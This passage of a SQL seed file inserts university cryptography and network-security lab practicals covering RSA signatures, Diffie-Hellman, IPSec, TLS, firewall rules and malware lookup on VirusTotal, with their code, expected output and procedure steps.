private_key = key_pair.export_key()
public_key = key_pair.publickey().export_key()

print("=" * 60)
print(" RSA DIGITAL SIGNATURE DEMONSTRATION")
print("=" * 60)
print("\nPublic Key:\n")
print(public_key.decode())
print("\nPrivate Key:\n")
print(private_key.decode())

message = "Hello, World!"
print("\nOriginal Message:")
print(message)

hash_object = SHA256.new(message.encode())
private_key_obj = RSA.import_key(private_key)
signature = pkcs1_15.new(private_key_obj).sign(hash_object)

print("\nDigital Signature (Hex):")
print(binascii.hexlify(signature).decode())

public_key_obj = RSA.import_key(public_key)
verify_hash = SHA256.new(message.encode())

try:
    pkcs1_15.new(public_key_obj).verify(verify_hash, signature)
    print("\nSignature Verification: VALID")
except (ValueError, TypeError):
    print("\nSignature Verification: INVALID")$code$,
    $orig$!pip install -q pycryptodome
import binascii
from Crypto.PublicKey import RSA from Crypto.Signature import pkcs1_15 from Crypto.Hash import SHA256 key_pair = RSA.generate(2048) private_key = key_pair.export_key()
public_key = key_pair.publickey().export_key()
print("=" * 60)
print(" RSA DIGITAL SIGNATURE DEMONSTRATION")
print("=" * 60)
print("\nPublic Key:\n") print(public_key.decode())
print("\nPrivate Key:\n") print(private_key.decode())
message = "Hello, World!"
print("\nOriginal Message:") print(message)
hash_object = SHA256.new(message.encode()) private_key_obj = RSA.import_key(private_key)
signature = pkcs1_15.new(private_key_obj).sign(hash_object)
print("\nDigital Signature (Hex):")
print(binascii.hexlify(signature).decode()) public_key_obj = RSA.import_key(public_key) verify_hash = SHA256.new(message.encode())
try:
    pkcs1_15.new(public_key_obj).verify(verify_hash, signature)
    print("\nSignature Verification: VALID") except (ValueError, TypeError):
    print("\nSignature Verification: INVALID")$orig$,
    $lang$Python$lang$,
    $out$============================================================
 RSA DIGITAL SIGNATURE DEMONSTRATION
============================================================
Original Message:
Hello, World!

Digital Signature (Hex):
81fc00d294a6bd74a9c0e09b94ce2aa345a79cc2545266b8ec8ddc0829514349cd0513e72abfb5947b9f912da1445ae710904953e823149a2637fa5782aac30e0ce93...

Signature Verification: VALID$out$,
    $json$["Generate a 2048-bit RSA key pair and export the PEM-encoded private and public keys.","Compute the SHA-256 digest of `\"Hello, World!\"` using `SHA256.new(message.encode())`.","Sign the SHA-256 hash using the sender private key via `pkcs1_15.new(private_key_obj).sign(hash_object)`.","Verify the signature using the sender public key via `pkcs1_15.new(public_key_obj).verify(verify_hash, signature)`.","Print `\"Signature Verification: VALID\"` if verification succeeds, or `\"INVALID\"` if `ValueError`/`TypeError` is raised."]$json$::jsonb,
    $json$["Install PyCryptodome: `pip install pycryptodome`","Run the Python script to generate keys, sign the message, and verify the digital signature."]$json$::jsonb,
    $json$["Requires `pycryptodome` (`pip install pycryptodome`)."]$json$::jsonb,
    ARRAY[$item$digital signature$item$, $item$rsa signature$item$, $item$pkcs1_15$item$, $item$sha256$item$, $item$pycryptodome$item$, $item$signature verification$item$, $item$authenticity$item$]::text[],
    ARRAY[$item$CNS Practical 4$item$, $item$RSA Digital Signature in Python$item$]::text[],
    $pdf$finalCNS_69f47646.pdf$pdf$,
    ARRAY[1, 7]::integer[],
    $v$corrected$v$,
    false,
    true
)
ON CONFLICT (source_key) DO UPDATE SET
    subject_id = EXCLUDED.subject_id,
    practical_number = EXCLUDED.practical_number,
    title = EXCLUDED.title,
    original_question = EXCLUDED.original_question,
    corrected_code = EXCLUDED.corrected_code,
    original_code = EXCLUDED.original_code,
    programming_language = EXCLUDED.programming_language,
    expected_output = EXCLUDED.expected_output,
    algorithm_steps = EXCLUDED.algorithm_steps,
    procedure_steps = EXCLUDED.procedure_steps,
    instructions = EXCLUDED.instructions,
    keywords = EXCLUDED.keywords,
    aliases = EXCLUDED.aliases,
    source_pdf = EXCLUDED.source_pdf,
    source_pages = EXCLUDED.source_pages,
    verification_status = EXCLUDED.verification_status,
    review_required = EXCLUDED.review_required,
    is_published = EXCLUDED.is_published,
    updated_at = now();

-- [Cryptography and Network Security] Practical 5: Diffie-Hellman Key Exchange Algorithm (source_key: cryptography-and-network-security-practical-5)
INSERT INTO public.practicals (
    id,
    source_key,
    subject_id,
    practical_number,
    title,
    original_question,
    corrected_code,
    original_code,
    programming_language,
    expected_output,
    algorithm_steps,
    procedure_steps,
    instructions,
    keywords,
    aliases,
    source_pdf,
    source_pages,
    verification_status,
    review_required,
    is_published
) VALUES (
    'd4000000-0000-4000-8000-000000000005',
    $skey$cryptography-and-network-security-practical-5$skey$,
    (SELECT id FROM public.subjects WHERE slug = $s$cryptography-and-network-security$s$),
    5,
    $title$Diffie-Hellman Key Exchange Algorithm$title$,
    $q$A Key Exchange Using Diffine Hellmen Implement The Diffine Hellman Key Exchange Algorithm To Security Exchange Key Between Two Entities Over An Insecure Network.$q$,
    $code$import secrets

def diffie_hellman_exchange():
    """
    Simulates the Diffie-Hellman Key Exchange between two parties: Alice and Bob.
    """
    # 1. Publicly known variables
    # Agreed upon over an insecure channel
    # In real applications, P is a massive prime number.
    # For this practical, we will use a smaller prime number.
    P = 997  # Prime Modulus
    G = 7    # Generator (Primitive root modulo P)

    print("=== 1. Public Parameters (Visible to any eavesdropper) ===")
    print(f"Prime Modulus (P): {P}")
    print(f"Generator (G):     {G}\n")

    # 2. Alice's Setup
    # Alice generates her private key 'a' and calculates her public key 'A'
    a = secrets.randbelow(P - 2) + 1
    A = pow(G, a, P)

    print("=== 2. Alice's Operations ===")
    print(f"Alice's Private Key (a): {a} <-- (Kept completely secret)")
    print(f"Alice's Public Key (A):  {A} <-- (Sent to Bob over network)\n")

    # 3. Bob's Setup
    # Bob generates his private key 'b' and calculates his public key 'B'
    b = secrets.randbelow(P - 2) + 1
    B = pow(G, b, P)

    print("=== 3. Bob's Operations ===")
    print(f"Bob's Private Key (b):   {b} <-- (Kept completely secret)")
    print(f"Bob's Public Key (B):    {B} <-- (Sent to Alice over network)\n")

    # 4. Exchange & Shared Secret Calculation
    # Alice calculates the secret using Bob's public key and her private key
    alice_shared_secret = pow(B, a, P)

    # Bob calculates the secret using Alice's public key and his private key
    bob_shared_secret = pow(A, b, P)

    print("=== 4. Shared Secret Calculation (Done locally by each party) ===")
    print(f"Alice calculates shared secret: {alice_shared_secret}")
    print(f"Bob calculates shared secret:   {bob_shared_secret}\n")

    # 5. Verification
    print("=== 5. Verification ===")
    if alice_shared_secret == bob_shared_secret:
        print("Success! Both parties have established the exact same symmetric key.")
        print("They can now use this key to encrypt future messages (e.g., using AES).")
    else:
        print("Error! The keys do not match.")

if __name__ == "__main__":
    diffie_hellman_exchange()$code$,
    $orig$import secrets

def diffie_hellman_exchange():
    """
    Simulates the Diffie-Hellman Key Exchange between two parties: Alice and Bob. """
    # 1. Publicly known variables
    P = 997 # Prime Modulus
    G = 7 # Generator (Primitive root modulo P)
    print("=== 1. Public Parameters (Visible to any eavesdropper) ===")
    print(f"Prime Modulus (P): {P}")
    print(f"Generator (G):     {G}\n")
    # 2. Alice's Setup
    a = secrets.randbelow(P - 2) + 1
    A = pow(G, a, P)
    print("=== 2. Alice's Operations ===")
    print(f"Alice's Private Key (a): {a} <-- (Kept completely secret)")
    print(f"Alice's Public Key (A): {A} <-- (Sent to Bob over network)\n")
    # 3. Bob's Setup
    b = secrets.randbelow(P - 2) + 1
    B = pow(G, b, P)
    print("=== 3. Bob's Operations ===")
    print(f"Bob's Private Key (b): {b} <-- (Kept completely secret)")
    print(f"Bob's Public Key (B): {B} <-- (Sent to Alice over network)\n")
    # 4. Exchange & Shared Secret Calculation
    alice_shared_secret = pow(B, a, P)
    bob_shared_secret = pow(A, b, P)
    print("=== 4. Shared Secret Calculation (Done locally by each party) ===")
    print(f"Alice calculates shared secret: {alice_shared_secret}")
    print(f"Bob calculates shared secret: {bob_shared_secret}\n")
    # 5. Verification
    print("=== 5. Verification ===")
    if alice_shared_secret == bob_shared_secret:
        print("Success! Both parties have established the exact same symmetric key.")
        print("They can now use this key to encrypt future messages (e.g., using AES).")
    else:
        print("Error! The keys do not match.")$orig$,
    $lang$Python$lang$,
    $out$=== 1. Public Parameters (Visible to any eavesdropper) ===
Prime Modulus (P): 997
Generator (G):     7

=== 2. Alice's Operations ===
Alice's Private Key (a): 323 <-- (Kept completely secret)
Alice's Public Key (A):  781 <-- (Sent to Bob over network)

=== 3. Bob's Operations ===
Bob's Private Key (b):   73 <-- (Kept completely secret)
Bob's Public Key (B):    280 <-- (Sent to Alice over network)

=== 4. Shared Secret Calculation (Done locally by each party) ===
Alice calculates shared secret: 96
Bob calculates shared secret:   96

=== 5. Verification ===
Success! Both parties have established the exact same symmetric key.
They can now use this key to encrypt future messages (e.g., using AES).$out$,
    $json$["Agree publicly on Prime Modulus P = 997 and Generator G = 7.","Alice generates secret random integer a in [1, P-2] and computes public key A = G^a mod P.","Bob generates secret random integer b in [1, P-2] and computes public key B = G^b mod P.","Alice and Bob exchange A and B over the insecure channel.","Alice computes shared secret s_A = B^a mod P; Bob computes s_B = A^b mod P.","Verify that s_A == s_B."]$json$::jsonb,
    $json$["Save the script as `diffie_hellman.py` and run `python3 diffie_hellman.py` (uses Python standard library `secrets`)."]$json$::jsonb,
    $json$["Conservative correction: added `if __name__ == \"__main__\": diffie_hellman_exchange()` at the end of the file so running the script produces the output shown on page 9."]$json$::jsonb,
    ARRAY[$item$diffie-hellman$item$, $item$diffie hellman$item$, $item$diffine hellmen$item$, $item$key exchange$item$, $item$alice and bob$item$, $item$shared secret$item$, $item$primitive root$item$]::text[],
    ARRAY[$item$CNS Practical 5$item$, $item$Diffie-Hellman Key Exchange in Python$item$]::text[],
    $pdf$finalCNS_69f47646.pdf$pdf$,
    ARRAY[1, 8, 9]::integer[],
    $v$corrected$v$,
    false,
    true
)
ON CONFLICT (source_key) DO UPDATE SET
    subject_id = EXCLUDED.subject_id,
    practical_number = EXCLUDED.practical_number,
    title = EXCLUDED.title,
    original_question = EXCLUDED.original_question,
    corrected_code = EXCLUDED.corrected_code,
    original_code = EXCLUDED.original_code,
    programming_language = EXCLUDED.programming_language,
    expected_output = EXCLUDED.expected_output,
    algorithm_steps = EXCLUDED.algorithm_steps,
    procedure_steps = EXCLUDED.procedure_steps,
    instructions = EXCLUDED.instructions,
    keywords = EXCLUDED.keywords,
    aliases = EXCLUDED.aliases,
    source_pdf = EXCLUDED.source_pdf,
    source_pages = EXCLUDED.source_pages,
    verification_status = EXCLUDED.verification_status,
    review_required = EXCLUDED.review_required,
    is_published = EXCLUDED.is_published,
    updated_at = now();

-- [Cryptography and Network Security] Practical 6: Configure IPSec on Network Devices (Cisco Packet Tracer) (source_key: cryptography-and-network-security-practical-6)
INSERT INTO public.practicals (
    id,
    source_key,
    subject_id,
    practical_number,
    title,
    original_question,
    corrected_code,
    original_code,
    programming_language,
    expected_output,
    algorithm_steps,
    procedure_steps,
    instructions,
    keywords,
    aliases,
    source_pdf,
    source_pages,
    verification_status,
    review_required,
    is_published
) VALUES (
    'd4000000-0000-4000-8000-000000000006',
    $skey$cryptography-and-network-security-practical-6$skey$,
    (SELECT id FROM public.subjects WHERE slug = $s$cryptography-and-network-security$s$),
    6,
    $title$Configure IPSec on Network Devices (Cisco Packet Tracer)$title$,
    $q$To Configure IPSEC On Network Devices To Provide Secure Communication And Protect Against Unauthorized Access And Attacks.$q$,
    $code$! Cisco Packet Tracer Router CLI Commands Visible in Screenshots (Pages 10-13)
! PC0 IP: 192.168.1.2 /24 (Gateway 192.168.1.1)
! PC1 IP: 192.168.2.2 /24 (Gateway 192.168.2.1)

! Verification Commands in PC0 / PC1 Command Prompt:
ping 192.168.2.2
ping 192.168.1.1$code$,
    NULL,
    $lang$Cisco IOS CLI (Packet Tracer)$lang$,
    $out$Pinging 192.168.2.2 with 32 bytes of data:
Reply from 192.168.2.2: bytes=32 time<1ms TTL=128
Reply from 192.168.2.2: bytes=32 time<1ms TTL=128
Ping statistics for 192.168.2.2:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss)$out$,
    '[]'::jsonb,
    $json$["Step 1: Build the topology in Cisco Packet Tracer with 3 Routers (Router0, Router1, Router2), 2 Switches (2960-24TT), and 2 PCs (PC0 and PC1).","Step 2: Configure PC0 Desktop -> IP Configuration with IP Address `192.168.1.2`, Subnet Mask `255.255.255.0`, and Default Gateway `192.168.1.1`.","Step 3: Configure PC1 Desktop -> IP Configuration with IP Address `192.168.2.2`, Subnet Mask `255.255.255.0`, and Default Gateway `192.168.2.1`.","Step 4-8: Configure GigabitEthernet and Serial interface IP addresses and `no shutdown` on Router0, Router1, and Router2.","Step 9: Verify all physical/logical links between PC0, Switches, and Routers are up (green triangles).","Step 10-12: Configure static/dynamic routing and IPSec security policy (`show ip route` / securityk9 package) on the routers in the IOS CLI tab.","Step 13 (Output): Open Command Prompt on PC0 and PC1 and execute `ping 192.168.2.2` and `ping 192.168.1.1` to verify end-to-end encrypted connectivity."]$json$::jsonb,
    $json$["Source PDF Note: Pages 10-13 of `finalCNS_69f47646.pdf` contain numbered step headings (`Step 1` through `Step 12`) with low-resolution Cisco Packet Tracer screenshots and no body text. The procedure steps above summarize the visible Packet Tracer configuration dialogs."]$json$::jsonb,
    ARRAY[$item$ipsec$item$, $item$cisco packet tracer$item$, $item$network devices$item$, $item$router configuration$item$, $item$ping 192.168.2.2$item$, $item$cns practical 6$item$]::text[],
    ARRAY[$item$CNS Practical 6$item$, $item$Configure IPSec on Network Devices in Packet Tracer$item$]::text[],
    $pdf$finalCNS_69f47646.pdf$pdf$,
    ARRAY[1, 10, 11, 12, 13]::integer[],
    $v$verified$v$,
    false,
    true
)
ON CONFLICT (source_key) DO UPDATE SET
    subject_id = EXCLUDED.subject_id,
    practical_number = EXCLUDED.practical_number,
    title = EXCLUDED.title,
    original_question = EXCLUDED.original_question,
    corrected_code = EXCLUDED.corrected_code,
    original_code = EXCLUDED.original_code,
    programming_language = EXCLUDED.programming_language,
    expected_output = EXCLUDED.expected_output,
    algorithm_steps = EXCLUDED.algorithm_steps,
    procedure_steps = EXCLUDED.procedure_steps,
    instructions = EXCLUDED.instructions,
    keywords = EXCLUDED.keywords,
    aliases = EXCLUDED.aliases,
    source_pdf = EXCLUDED.source_pdf,
    source_pages = EXCLUDED.source_pages,
    verification_status = EXCLUDED.verification_status,
    review_required = EXCLUDED.review_required,
    is_published = EXCLUDED.is_published,
    updated_at = now();

-- [Cryptography and Network Security] Practical 7: Web Security with SSL/TLS Protocols (Secure Socket Client in Python) (source_key: cryptography-and-network-security-practical-7)
INSERT INTO public.practicals (
    id,
    source_key,
    subject_id,
    practical_number,
    title,
    original_question,
    corrected_code,
    original_code,
    programming_language,
    expected_output,
    algorithm_steps,
    procedure_steps,
    instructions,
    keywords,
    aliases,
    source_pdf,
    source_pages,
    verification_status,
    review_required,
    is_published
) VALUES (
    'd4000000-0000-4000-8000-000000000007',
    $skey$cryptography-and-network-security-practical-7$skey$,
    (SELECT id FROM public.subjects WHERE slug = $s$cryptography-and-network-security$s$),
    7,
    $title$Web Security with SSL/TLS Protocols (Secure Socket Client in Python)$title$,
    $q$Web Security With SSL/TLS: Configure And Implement Secure Web Communication Using SSL/TLS Protocols Including Certificate Management And Secure Session Establishment.$q$,
    $code$import ssl
import socket

context = ssl.create_default_context()

sock = socket.create_connection(("example.com", 443))
ssl_sock = context.wrap_socket(sock, server_hostname="example.com")

request = (
    "GET / HTTP/1.1\r\n"
    "Host: example.com\r\n"
    "Connection: close\r\n"
    "\r\n"
)

ssl_sock.sendall(request.encode())
response = b""

while True:
    data = ssl_sock.recv(4096)
    if not data:
        break
    response += data

ssl_sock.close()

headers, body = response.split(b"\r\n\r\n", 1)
print(headers.decode("utf-8"))$code$,
    $orig$import ssl import socket
context = ssl.create_default_context()
sock = socket.create_connection(("example.com", 443)) ssl_sock = context.wrap_socket(sock, server_hostname="example.com")
request = (
"GET / HTTP/1.1\r\n"
"Host: example.com\r\n"
"Connection: close\r\n"
"\r\n"
)
ssl_sock.sendall(request.encode())
response = b""
while True:
data = ssl_sock.recv(4096)
if not data: break
response += data ssl_sock.close() headers,
body = response.split(b"\r\n\r\n", 1)
print(headers.decode("utf-8"))$orig$,
    $lang$Python$lang$,
    $out$HTTP/1.1 200 OK
Date: Wed, 01 Jul 2026 03:15:25 GMT
Content-Type: text/html
Transfer-Encoding: chunked
Connection: close
Server: cloudflare
Accept-Ranges: bytes$out$,
    $json$["Import Python standard `ssl` and `socket` modules.","Create a default SSL context with certificate verification enabled via `ssl.create_default_context()`.","Open a TCP connection to `(\"example.com\", 443)` and wrap the socket with TLS SNI `server_hostname=\"example.com\"`.","Send a raw `GET / HTTP/1.1` request over the encrypted TLS socket and read 4096-byte chunks until EOF.","Close the SSL socket, split the HTTP response at `b\"\\r\\n\\r\\n\"`, and print the UTF-8 response headers."]$json$::jsonb,
    $json$["Save the script as `ssl_tls_client.py` and run `python3 ssl_tls_client.py` in a terminal with internet connectivity."]$json$::jsonb,
    $json$["Uses Python built-in `ssl` and `socket` libraries."]$json$::jsonb,
    ARRAY[$item$ssl$item$, $item$tls$item$, $item$ssl/tls$item$, $item$web security$item$, $item$create_default_context$item$, $item$wrap_socket$item$, $item$example.com$item$, $item$certificate management$item$]::text[],
    ARRAY[$item$CNS Practical 7$item$, $item$Web Security with SSL/TLS in Python$item$]::text[],
    $pdf$finalCNS_69f47646.pdf$pdf$,
    ARRAY[1, 14]::integer[],
    $v$corrected$v$,
    false,
    true
)
ON CONFLICT (source_key) DO UPDATE SET
    subject_id = EXCLUDED.subject_id,
    practical_number = EXCLUDED.practical_number,
    title = EXCLUDED.title,
    original_question = EXCLUDED.original_question,
    corrected_code = EXCLUDED.corrected_code,
    original_code = EXCLUDED.original_code,
    programming_language = EXCLUDED.programming_language,
    expected_output = EXCLUDED.expected_output,
    algorithm_steps = EXCLUDED.algorithm_steps,
    procedure_steps = EXCLUDED.procedure_steps,
    instructions = EXCLUDED.instructions,
    keywords = EXCLUDED.keywords,
    aliases = EXCLUDED.aliases,
    source_pdf = EXCLUDED.source_pdf,
    source_pages = EXCLUDED.source_pages,
    verification_status = EXCLUDED.verification_status,
    review_required = EXCLUDED.review_required,
    is_published = EXCLUDED.is_published,
    updated_at = now();

-- [Cryptography and Network Security] Practical 8: Intrusion Detection System (IDS) Using Python and OpenCV (source_key: cryptography-and-network-security-practical-8)
INSERT INTO public.practicals (
    id,
    source_key,
    subject_id,
    practical_number,
    title,
    original_question,
    corrected_code,
    original_code,
    programming_language,
    expected_output,
    algorithm_steps,
    procedure_steps,
    instructions,
    keywords,
    aliases,
    source_pdf,
    source_pages,
    verification_status,
    review_required,
    is_published
) VALUES (
    'd4000000-0000-4000-8000-000000000008',
    $skey$cryptography-and-network-security-practical-8$skey$,
    (SELECT id FROM public.subjects WHERE slug = $s$cryptography-and-network-security$s$),
    8,
    $title$Intrusion Detection System (IDS) Using Python and OpenCV$title$,
    $q$Intrusion Detection System: Setup And Configure An Intrusion Detection (IDS) To Monitor Network Traffic And Detact Potential Security Breaches Or Malicious Activities.$q$,
    $code$import cv2
import numpy as np
from IPython.display import Image, display

img = cv2.imread("/content/shinchan.webp")
if img is None:
    print("Error: Image not found.")
    exit()

gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
thresh = cv2.threshold(
    gray, 170, 255, cv2.THRESH_BINARY_INV + cv2.THRESH_OTSU
)[1]

kernel = np.ones((10, 10), np.uint8)
eroded = cv2.erode(thresh, kernel, iterations=2)
dilated = cv2.dilate(eroded, kernel, iterations=2)

contours, _ = cv2.findContours(
    dilated, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE
)

intrusion_detected = False
for contour in contours:
    x, y, w, h = cv2.boundingRect(contour)
    aspect_ratio = float(w) / h
    area = cv2.contourArea(contour)
    if aspect_ratio > 1.5 and area > 500:
        # Draw a green bounding box
        cv2.rectangle(img, (x, y), (x + w, y + h), (0, 255, 0), 2)
        print(
            f"Intrusion detected at location: ({x}, {y}) "
            f"with width: {w} and height: {h}"
        )
        intrusion_detected = True

cv2.imwrite("output.jpg", img)

if intrusion_detected:
    print("Intrusion Detected")
else:
    print("No intrusion detected.")

print("Displaying the output image:")
display(Image(filename="output.jpg"))$code$,
    $orig$import cv2 import numpy as np from IPython.display import Image, display img = cv2.imread("/content/shinchan.webp")
if img is None: print("Error: Image not found.") exit()
gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
thresh = cv2.threshold(
gray, 170, 255, cv2.THRESH_BINARY_INV + cv2.THRESH_OTSU
)[1]
kernel = np.ones((10, 10), np.uint8)
eroded = cv2.erode(thresh, kernel, iterations=2) dilated = cv2.dilate(eroded, kernel, iterations=2)
contours, _ = cv2.findContours(
dilated, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE
)
intrusion_detected = False
for contour in contours: x, y, w, h = cv2.boundingRect(contour)
aspect_ratio = float(w) / h area = cv2.contourArea(contour)
if aspect_ratio > 1.5 and area > 500:
    # Draw a green bounding box
    cv2.rectangle(img, (x, y), (x + w, y + h), (0, 255, 0), 2)
    print( f"Intrusion detected at location: ({x}, {y}) " f"with width: {w} and height: {h}" )
    intrusion_detected = True
cv2.imwrite("output.jpg", img)
if intrusion_detected:
    print("Intrusion Detected") else:
    print("No intrusion detected.")
print("Displaying the output image:")
display(Image(filename="output.jpg"))$orig$,
    $lang$Python$lang$,
    $out$Intrusion detected at location: (602, 120) with width: 504 and height: 202
Intrusion Detected
Displaying the output image:$out$,
    $json$["Load input image `/content/shinchan.webp` using `cv2.imread()` and convert to grayscale.","Apply Otsu inverse binary thresholding (`cv2.THRESH_BINARY_INV + cv2.THRESH_OTSU`).","Perform morphological erosion and dilation with a 10x10 kernel (`np.ones((10, 10), np.uint8)`).","Extract external contours via `cv2.findContours()` and compute bounding box `(x, y, w, h)`, `aspect_ratio = w / h`, and `area`.","If `aspect_ratio > 1.5` and `area > 500`, draw a green rectangle around the region, set `intrusion_detected = True`, and save `output.jpg`."]$json$::jsonb,
    $json$["Open Google Colab or Jupyter Notebook, upload `shinchan.webp` to `/content/shinchan.webp`, and run the cell."]$json$::jsonb,
    $json$["Requires `opencv-python`, `numpy`, and `ipython` (`pip install opencv-python numpy ipython`)."]$json$::jsonb,
    ARRAY[$item$intrusion detection system$item$, $item$ids$item$, $item$opencv$item$, $item$cv2$item$, $item$findcontours$item$, $item$shinchan.webp$item$, $item$cns practical 8$item$]::text[],
    ARRAY[$item$CNS Practical 8$item$, $item$Intrusion Detection System Python OpenCV$item$]::text[],
    $pdf$finalCNS_69f47646.pdf$pdf$,
    ARRAY[1, 15, 16]::integer[],
    $v$corrected$v$,
    false,
    true
)
ON CONFLICT (source_key) DO UPDATE SET
    subject_id = EXCLUDED.subject_id,
    practical_number = EXCLUDED.practical_number,
    title = EXCLUDED.title,
    original_question = EXCLUDED.original_question,
    corrected_code = EXCLUDED.corrected_code,
    original_code = EXCLUDED.original_code,
    programming_language = EXCLUDED.programming_language,
    expected_output = EXCLUDED.expected_output,
    algorithm_steps = EXCLUDED.algorithm_steps,
    procedure_steps = EXCLUDED.procedure_steps,
    instructions = EXCLUDED.instructions,
    keywords = EXCLUDED.keywords,
    aliases = EXCLUDED.aliases,
    source_pdf = EXCLUDED.source_pdf,
    source_pages = EXCLUDED.source_pages,
    verification_status = EXCLUDED.verification_status,
    review_required = EXCLUDED.review_required,
    is_published = EXCLUDED.is_published,
    updated_at = now();

-- [Cryptography and Network Security] Practical 9: Malware Analysis and Detection Using VirusShare and VirusTotal (source_key: cryptography-and-network-security-practical-9)
INSERT INTO public.practicals (
    id,
    source_key,
    subject_id,
    practical_number,
    title,
    original_question,
    corrected_code,
    original_code,
    programming_language,
    expected_output,
    algorithm_steps,
    procedure_steps,
    instructions,
    keywords,
    aliases,
    source_pdf,
    source_pages,
    verification_status,
    review_required,
    is_published
) VALUES (
    'd4000000-0000-4000-8000-000000000009',
    $skey$cryptography-and-network-security-practical-9$skey$,
    (SELECT id FROM public.subjects WHERE slug = $s$cryptography-and-network-security$s$),
    9,
    $title$Malware Analysis and Detection Using VirusShare and VirusTotal$title$,
    $q$Malware Analysis and Detection: Analyze and Identity malware samples using antivirus tools, analyze their behavior and develop counter measures to mitigate their impact.$q$,
    NULL,
    NULL,
    $lang$Security Analysis (VirusTotal)$lang$,
    $out$VirusTotal analysis report showing multi-engine antivirus detection status (0/64 or 58/72 detections), MD5/SHA-1/SHA-256 file hashes, and behavioral signatures.$out$,
    '[]'::jsonb,
    $json$["Step 1: Go to `https://www.virusshare.com` to inspect and download a sample archive for analysis.","Step 2: Click the download icon so the sample is downloaded in `.zip` format.","Step 3: Open `https://www.virustotal.com` in the web browser to analyze the sample.","Step 4: Click on \"Choose file\", select the downloaded `.zip` file from your local folder, and review the multi-engine antivirus detection report (Detection, Details, Community tabs)."]$json$::jsonb,
    $json$["Uses https://www.virusshare.com and https://www.virustotal.com for static hash & multi-engine antivirus analysis."]$json$::jsonb,
    ARRAY[$item$malware analysis$item$, $item$malware detection$item$, $item$virusshare$item$, $item$virustotal$item$, $item$antivirus tools$item$, $item$cns practical 9$item$]::text[],
    ARRAY[$item$CNS Practical 9$item$, $item$Malware Analysis using VirusShare and VirusTotal$item$]::text[],
    $pdf$finalCNS_69f47646.pdf$pdf$,
    ARRAY[1, 17, 18]::integer[],
    $v$verified$v$,
    false,
    true
)
ON CONFLICT (source_key) DO UPDATE SET
    subject_id = EXCLUDED.subject_id,
    practical_number = EXCLUDED.practical_number,
    title = EXCLUDED.title,
    original_question = EXCLUDED.original_question,
    corrected_code = EXCLUDED.corrected_code,
    original_code = EXCLUDED.original_code,
    programming_language = EXCLUDED.programming_language,
    expected_output = EXCLUDED.expected_output,
    algorithm_steps = EXCLUDED.algorithm_steps,
    procedure_steps = EXCLUDED.procedure_steps,
    instructions = EXCLUDED.instructions,
    keywords = EXCLUDED.keywords,
    aliases = EXCLUDED.aliases,
    source_pdf = EXCLUDED.source_pdf,
    source_pages = EXCLUDED.source_pages,
    verification_status = EXCLUDED.verification_status,
    review_required = EXCLUDED.review_required,
    is_published = EXCLUDED.is_published,
    updated_at = now();

-- [Cryptography and Network Security] Practical 10: Firewall Configuration and Rule-Based Filtering (Windows Defender Firewall) (source_key: cryptography-and-network-security-practical-10)
INSERT INTO public.practicals (
    id,
    source_key,
    subject_id,
    practical_number,
    title,
    original_question,
    corrected_code,
    original_code,
    programming_language,
    expected_output,
    algorithm_steps,
    procedure_steps,
    instructions,
    keywords,
    aliases,
    source_pdf,
    source_pages,
    verification_status,
    review_required,
    is_published
) VALUES (
    'd4000000-0000-4000-8000-000000000010',
    $skey$cryptography-and-network-security-practical-10$skey$,
    (SELECT id FROM public.subjects WHERE slug = $s$cryptography-and-network-security$s$),
    10,
    $title$Firewall Configuration and Rule-Based Filtering (Windows Defender Firewall)$title$,
    $q$Firewall Configuration and Rule-based Filtering: Configure and test firewall rules to control network traffic, filter packets based on specified criteria, and protect network resources from unauthorized access.$q$,
    $code$REM Resolve IPv4 and IPv6 addresses of target website to block
nslookup android.com

REM Ports used in Part A Rule:
REM Protocol: TCP | Specific Ports: 80, 443 | Action: Block the connection | Name: httpblock

REM IP Addresses used in Part B Rule (android.com):
REM IPv6: 2404:6800:4009:806::2004
REM IPv4: 142.250.71.100$code$,
    $orig$nslookup android.com$orig$,
    $lang$Windows Command Prompt / Firewall$lang$,
    $out$Part A: Browser displays "Your Internet access is blocked — Firewall or antivirus software may have blocked the connection."
Part B: Browser displays "This site can't be reached" when visiting www.android.com.$out$,
    '[]'::jsonb,
    $json$["PART A — BLOCKING HTTP/HTTPS TRAFFIC ON PORTS 80 AND 443:","Step 1: Open \"Windows Defender Firewall\" from Control Panel.","Step 2: Click on \"Advanced settings\" in the left pane.","Step 3: Click on \"Inbound Rules\" in the left pane.","Step 4: Click on \"New Rule...\" in the right Actions pane.","Step 5: Select the \"Port\" radio button, click Next, select \"TCP\", choose \"Specific local ports\", enter `80, 443`, and click Next.","Step 6: Select \"Block the connection\" and click Next.","Step 7: Check Domain, Private, and Public profiles and click Next.","Step 8-9: Name the rule `httpblock` and click Finish to add the Inbound Rule.","Step 10 (Outbound Rules): Click on \"Outbound Rules\" -> \"New Rule...\" -> select \"Port\" -> select \"TCP\" and Specific remote ports `80, 443` -> select \"Block the connection\" -> check all profiles -> name the rule `httpblock` and click Finish.","Output A: Try to access the internet in a browser; verify that internet access on ports 80/443 is blocked.","PART B — BLOCKING A SPECIFIC WEBSITE (WWW.ANDROID.COM) BY IP ADDRESS:","Step 1: Open the browser and verify `https://www.android.com` is initially accessible.","Step 2: Open Command Prompt and run `nslookup android.com` to find its IPv4 (`142.250.71.100`) and IPv6 (`2404:6800:4009:806::2004`) addresses.","Step 3: In Windows Defender Firewall with Advanced Security, click \"Inbound Rules\" -> \"New Rule...\" and select \"Custom\" rule.","Step 4: Under the Scope tab (Which remote IP addresses does this rule apply to?), select \"These IP addresses\", click Add, and insert both IPv6 (`2404:6800:4009:806::2004`) and IPv4 (`142.250.71.100`).","Step 5-6: Select \"Block the connection\", name the rule `block android`, and click Finish.","Step 7: Repeat the same Custom rule steps under \"Outbound Rules\" (All programs -> Scope: `2404:6800:4009:806::2004` and `142.250.71.100` -> Block the connection -> name `block android`).","Output B: Visit `https://www.android.com` in the browser and verify it is blocked (\"This site can't be reached\")."]$json$::jsonb,
    $json$["Covers both Port-based rule filtering (TCP ports 80, 443) and IP-based custom rule filtering (`nslookup android.com`) in Windows Defender Firewall."]$json$::jsonb,
    ARRAY[$item$firewall$item$, $item$windows defender firewall$item$, $item$inbound rules$item$, $item$outbound rules$item$, $item$rule-based filtering$item$, $item$nslookup$item$, $item$80, 443$item$, $item$httpblock$item$, $item$android.com$item$]::text[],
